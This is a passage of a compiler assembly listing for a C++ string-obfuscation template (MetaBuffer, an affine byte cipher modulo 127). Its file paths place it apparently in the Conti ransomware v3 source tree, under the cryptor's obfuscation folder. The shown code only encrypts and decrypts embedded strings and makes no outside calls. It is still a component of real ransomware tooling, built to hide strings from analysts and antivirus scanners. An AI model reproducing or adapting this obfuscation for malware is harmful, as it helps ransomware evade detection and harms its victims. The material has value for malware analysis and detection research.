  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv560 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> 